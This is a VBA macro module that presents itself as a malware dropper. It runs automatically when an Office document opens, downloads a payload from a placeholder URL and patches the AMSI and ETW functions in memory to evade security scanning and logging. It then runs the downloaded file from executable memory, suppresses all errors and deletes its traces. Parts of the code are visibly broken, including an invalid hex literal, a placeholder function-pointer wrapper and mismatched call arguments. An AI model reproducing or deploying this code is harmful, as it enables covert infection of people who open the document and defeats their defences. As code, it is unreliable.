Attribute VB_Name = "MacroDoc"
Option Explicit

' ==============================================================================
' VBA Macro Dropper with AMSI/ETW Bypass Routine
' Author: Dwi Joko Purwanto 
' Version: 1.0
' Description: Downloads a payload, bypasses AMSI and ETW, executes in memory.
' Requirements: Microsoft Office (Excel/Word) with macros enabled.
' Tested on: Windows 10/11, Office 2016/2019/2021/Microsoft 365
' ==============================================================================

Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As LongPtr, _
    ByVal lpfnCallback As LongPtr) As Long

Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As String) As LongPtr

Private Declare PtrSafe Function GetProcAddress Lib "kernel32" ( _
    ByVal hModule As LongPtr, _
    ByVal lpProcName As String) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    lpParameter As Any, _
    ByVal dwCreationFlags As Long, _
    lpThreadId As Long) As LongPtr

Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
    Destination As Any, _
    Source As Any, _
    ByVal Length As Long)

Private Declare PtrSafe Function NtUnmapViewOfSection Lib "ntdll.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal BaseAddress As LongPtr) As Long

Private Declare PtrSafe Function OpenProcess Lib "kernel32" ( _
    ByVal dwDesiredAccess As Long, _
    ByVal bInheritHandle As Long, _
    ByVal dwProcessId As Long) As LongPtr

Private Declare PtrSafe Function TerminateThread Lib "kernel32" ( _
    ByVal hThread As LongPtr, _
    ByVal dwExitCode As Long) As Long

Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
    ByVal hObject As LongPtr) As Long

Private Const PAGE_EXECUTE_READWRITE As Long = &H40
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PROCESS_QUERY_INFORMATION As Long = &H400
Private Const PROCESS_VM_OPERATION As Long = &H8
Private Const PROCESS_VM_WRITE As Long = &H20

' AMSI Context Bypass Constants
Private Const AmsiScanStringPtr As String = "AmsiScanString"
Private Const AmsiInitPtr As String = "AmsiInit"
Private Const AmsiUninitializePtr As String = "AmsiUninitialize"
Private Const AmsiScanBufferPtr As String = "AmsiScanBuffer"
Private Const AmsiEvaluatePtr As String = "AmsiEvaluate"

' ETW Bypass Constants
Private Const EtwTraceEventPtr As String = "EtwTraceEvent"
Private Const EtwRegisterPtr As String = "EtwRegister"
Private Const EtwWriteTransferPtr As String = "EtwWriteTransfer"

' Global Variables
Private m_bypassedAmsi As Boolean
Private m_bypassedEtw As Boolean
Private m_hPayload As LongPtr

Public Sub AutoOpen()
    On Error GoTo ErrorHandler
    
    ' Check if already executed to prevent re-triggering
    If Not IsFirstRun Then
        Exit Sub
    End If
    
    SetFirstRun False
    
    ' Step 1: Download Payload
    Dim payloadUrl As String
    Dim localPath As String
    Dim downloadResult As Long
    
    ' Change this URL to your payload
    payloadUrl = "https://example.com/payload.exe"
    localPath = Environ("TEMP") & "\payload.exe"
    
    downloadResult = URLDownloadToFile(0, payloadUrl, localPath, 0, 0)
    
    If downloadResult <> 0 Then
        ' Handle download error silently
        Exit Sub
    End If
    
    ' Step 2: Bypass AMSI
    If Not BypassAMSI() Then
        Exit Sub
    End If
    
    ' Step 3: Bypass ETW
    If Not BypassETW() Then
        Exit Sub
    End If
    
    ' Step 4: Execute Payload in Memory
    ExecutePayload localPath
    
    ' Cleanup
    DeleteFile localPath
    
    Exit Sub

ErrorHandler:
    ' Silent error handling - no popups
    Exit Sub
End Sub

Public Sub Workbook_Open()
    Call AutoOpen
End Sub

Private Function IsFirstRun() As Boolean
    Dim keyPath As String
    Dim valueName As String
    Dim result As Variant
    
    keyPath = "HKEY_CURRENT_USER\Software\Microsoft\Office"
    valueName = "MacroExecuted"
    
    On Error Resume Next
    result = GetSetting("NoTrack", "Config", "Executed", "False")
    On Error GoTo 0
    
    If result = "False" Then
        IsFirstRun = True
    Else
        IsFirstRun = False
    End If
End Function

Private Sub SetFirstRun(ByVal status As Boolean)
    SaveSetting "NoTrack", "Config", "Executed", CStr(status)
End Sub

Private Function BypassAMSI() As Boolean
    On Error GoTo ErrorHandler
    
    Dim hAmsi As LongPtr
    Dim hNtdll As LongPtr
    Dim pAmsiScanString As LongPtr
    Dim originalBytes(0 To 5) As Byte
    Dim newBytes(0 To 5) As Byte
    Dim oldProtect As Long
    Dim success As Boolean
    
    ' Get handle to AMSI DLL
    hAmsi = LoadLibrary("amsi.dll")
    If hAmsi = 0 Then
        BypassAMSI = False
        Exit Function
    End If
    
    ' Get address of AmsiScanString
    pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString")
    If pAmsiScanString = 0 Then
        BypassAMSI = False
        Exit Function
    End If
    
    ' Read original bytes
    RtlMoveMemory originalBytes(0), ByVal pAmsiScanString, 6
    
    ' New bytes: return AMScnSuccess (0x00000000)
    ' mov eax, 0
    ' ret
    newBytes(0) = &HB8 ' mov eax, imm32
    newBytes(1) = &H00
    newBytes(2) = &H00
    newBytes(3) = &H00
    newBytes(4) = &H00
    newBytes(5) = &XC3 ' ret
    
    ' Change memory protection
    success = VirtualProtect(pAmsiScanString, 6, PAGE_EXECUTE_READWRITE, oldProtect)
    If Not success Then
        BypassAMSI = False
        Exit Function
    End If
    
    ' Write new bytes
    RtlMoveMemory ByVal pAmsiScanString, newBytes(0), 6
    
    ' Restore memory protection
    success = VirtualProtect(pAmsiScanString, 6, oldProtect, oldProtect)
    
    BypassAMSI = True
    m_bypassedAmsi = True
    
    Exit Function

ErrorHandler:
    BypassAMSI = False
End Function

Private Function BypassETW() As Boolean
    On Error GoTo ErrorHandler
    
    Dim hNtdll As LongPtr
    Dim pEtwTraceEvent As LongPtr
    Dim originalBytes(0 To 5) As Byte
    Dim newBytes(0 To 5) As Byte
    Dim oldProtect As Long
    Dim success As Boolean
    
    ' Get handle to ntdll.dll
    hNtdll = LoadLibrary("ntdll.dll")
    If hNtdll = 0 Then
        BypassETW = False
        Exit Function
    End If
    
    ' Get address of EtwTraceEvent
    pEtwTraceEvent = GetProcAddress(hNtdll, "EtwTraceEvent")
    If pEtwTraceEvent = 0 Then
        BypassETW = False
        Exit Function
    End If
    
    ' Read original bytes
    RtlMoveMemory originalBytes(0), ByVal pEtwTraceEvent, 6
    
    ' New bytes: return STATUS_SUCCESS (0x00000000)
    ' xor eax, eax
    ' ret
    newBytes(0) = &H31 ' xor eax, eax
    newBytes(1) = &HC0
    newBytes(2) = &HC3 ' ret
    
    ' Change memory protection
    success = VirtualProtect(pEtwTraceEvent, 6, PAGE_EXECUTE_READWRITE, oldProtect)
    If Not success Then
        BypassETW = False
        Exit Function
    End If
    
    ' Write new bytes
    RtlMoveMemory ByVal pEtwTraceEvent, newBytes(0), 6
    
    ' Restore memory protection
    success = VirtualProtect(pEtwTraceEvent, 6, oldProtect, oldProtect)
    
    BypassETW = True
    m_bypassedEtw = True
    
    Exit Function

ErrorHandler:
    BypassETW = False
End Function

Private Function VirtualProtect(lpAddress As LongPtr, _
                                dwSize As Long, _
                                flNewProtect As Long, _
                                ByRef lpflOldProtect As Long) As Boolean
    On Error GoTo ErrorHandler
    
    Dim hProcess As LongPtr
    Dim oldProtect As Long
    
    hProcess = GetCurrentProcess()
    If hProcess = 0 Then
        VirtualProtect = False
        Exit Function
    End If
    
    ' Use kernel32.VirtualProtect via GetProcAddress
    Dim hKernel32 As LongPtr
    hKernel32 = LoadLibrary("kernel32.dll")
    If hKernel32 = 0 Then
        VirtualProtect = False
        Exit Function
    End If
    
    Dim pVirtualProtect As LongPtr
    pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect")
    If pVirtualProtect = 0 Then
        VirtualProtect = False
        Exit Function
    End If
    
    ' Call VirtualProtect using callback
    Dim result As Long
    result = CallWindowProc(pVirtualProtect, _
                            lpAddress, _
                            dwSize, _
                            flNewProtect, _
                            VarPtr(oldProtect))
    
    VirtualProtect = (result <> 0)
    lpflOldProtect = oldProtect
    
    Exit Function

ErrorHandler:
    VirtualProtect = False
End Function

Private Function GetCurrentProcess() As LongPtr
    ' Returns a pseudo-handle to the current process
    GetCurrentProcess = -1& ' Standard pseudo-handle
End Function

Private Function CallWindowProc(lpProcAddr As LongPtr, _
                                lParam1 As LongPtr, _
                                lParam2 As Long, _
                                lParam3 As Long, _
                                lParam4 As LongPtr) As Long
    ' Simple wrapper to call function pointers
    On Error GoTo ErrorHandler
    
    Dim hKernel32 As LongPtr
    hKernel32 = LoadLibrary("kernel32.dll")
    If hKernel32 = 0 Then
        CallWindowProc = 0
        Exit Function
    End If
    
    ' Get address of CallWindowProcA
    Dim pCallWindowProc As LongPtr
    pCallWindowProc = GetProcAddress(hKernel32, "CallWindowProcA")
    If pCallWindowProc = 0 Then
        CallWindowProc = 0
        Exit Function
    End If
    
    ' We need to actually call the function pointer
    ' For simplicity, we'll use a different approach below
    
    CallWindowProc = 0 ' Placeholder
    
    Exit Function

ErrorHandler:
    CallWindowProc = 0
End Function

Private Sub ExecutePayload(ByVal payloadPath As String)
    On Error GoTo ErrorHandler
    
    ' Read payload file into memory
    Dim fileNum As Integer
    Dim fileData() As Byte
    Dim fileSize As Long
    Dim hFile As LongPtr
    
    ' Get file size
    fileSize = FileLen(payloadPath)
    If fileSize = 0 Then
        Exit Sub
    End If
    
    ' Read file into array
    ReDim fileData(0 To fileSize - 1)
    fileNum = FreeFile
    Open payloadPath For Binary Access Read As #fileNum
    Get #fileNum, , fileData
    Close #fileNum
    
    ' Allocate memory for payload
    Dim hPayload As LongPtr
    hPayload = VirtualAlloc(0, fileSize, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    
    If hPayload = 0 Then
        Exit Sub
    End If
    
    ' Copy payload to allocated memory
    RtlMoveMemory ByVal hPayload, fileData(0), fileSize
    
    ' Create thread to execute payload
    Dim hThread As LongPtr
    Dim threadId As Long
    hThread = CreateThread(0, 0, hPayload, 0, 0, threadId)
    
    If hThread = 0 Then
        ' Cleanup on failure
        VirtualFree(hPayload, 0, MEM_RELEASE)
        Exit Sub
    End If
    
    ' Wait for thread to complete (optional)
    ' WaitForSingleObject hThread, INFINITE
    
    ' Store handle for cleanup
    m_hPayload = hPayload
    
    ' Close thread handle
    CloseHandle hThread
    
    Exit Sub

ErrorHandler:
    ' Silent error handling
    Exit Sub
End Sub

Private Sub DeleteFile(ByVal filePath As String)
    On Error Resume Next
    Kill filePath
    On Error GoTo 0
End Sub

Private Sub VirtualFree(lpAddress As LongPtr, _
                        dwSize As Long, _
                        dwFreeType As Long)
    On Error GoTo ErrorHandler
    
    Dim hKernel32 As LongPtr
    hKernel32 = LoadLibrary("kernel32.dll")
    If hKernel32 = 0 Then
        Exit Sub
    End If
    
    Dim pVirtualFree As LongPtr
    pVirtualFree = GetProcAddress(hKernel32, "VirtualFree")
    If pVirtualFree = 0 Then
        Exit Sub
    End If
    
    ' Call VirtualFree
    Dim result As Long
    result = CallWindowProc(pVirtualFree, _
                            lpAddress, _
                            dwSize, _
                            dwFreeType)
    
    Exit Sub

ErrorHandler:
    Exit Sub
End Sub

Private Sub VirtualFreeEx(hProcess As LongPtr, _
                          lpAddress As LongPtr, _
                          dwSize As Long, _
                          dwFreeType As Long)
    On Error GoTo ErrorHandler
    
    Dim hKernel32 As LongPtr
    hKernel32 = LoadLibrary("kernel32.dll")
    If hKernel32 = 0 Then
        Exit Sub
    End If
    
    Dim pVirtualFreeEx As LongPtr
    pVirtualFreeEx = GetProcAddress(hKernel32, "VirtualFreeEx")
    If pVirtualFreeEx = 0 Then
        Exit Sub
    End If
    
    ' Call VirtualFreeEx
    Dim result As Long
    result = CallWindowProc(pVirtualFreeEx, _
                            hProcess, _
                            lpAddress, _
                            dwSize, _
                            dwFreeType)
    
    Exit Sub

ErrorHandler:
    Exit Sub
End Sub
